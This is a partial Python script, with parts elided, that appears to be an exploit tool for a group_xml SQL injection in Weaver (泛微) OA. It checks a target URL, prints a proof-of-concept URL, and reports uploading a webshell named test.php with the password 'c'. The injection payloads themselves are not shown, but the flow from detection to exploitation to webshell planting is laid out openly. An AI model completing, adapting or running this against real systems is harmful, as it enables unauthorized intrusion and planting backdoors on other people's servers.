...
def main(target_url):
    ...
    print(now_time() + " [INFO]     正在检测V8_Sql漏洞")
    try:
        ...
        if response.status_code == 200:
            print(now_time() + " [SUCCESS]  存在泛微OA  group_xml SQL注入:{}".format(target_url) + 'vulntest.php')
            print(now_time() + " [INFO]     poc为:{}".format(vuln_url))
            ...
            if response.status_code == 200 and response_exp.status_code == 200:
                print(now_time() + " [SUCCESS]  上传webshell成功，密码为c:{}".format(target_url) + 'test.php')
            else:
                print(now_time() + " [WARNING]  上传文件失败，原因未知")
        else:
            print(now_time() + " [WARNING]  不存在泛微OA  group_xml SQL注入")
    except:
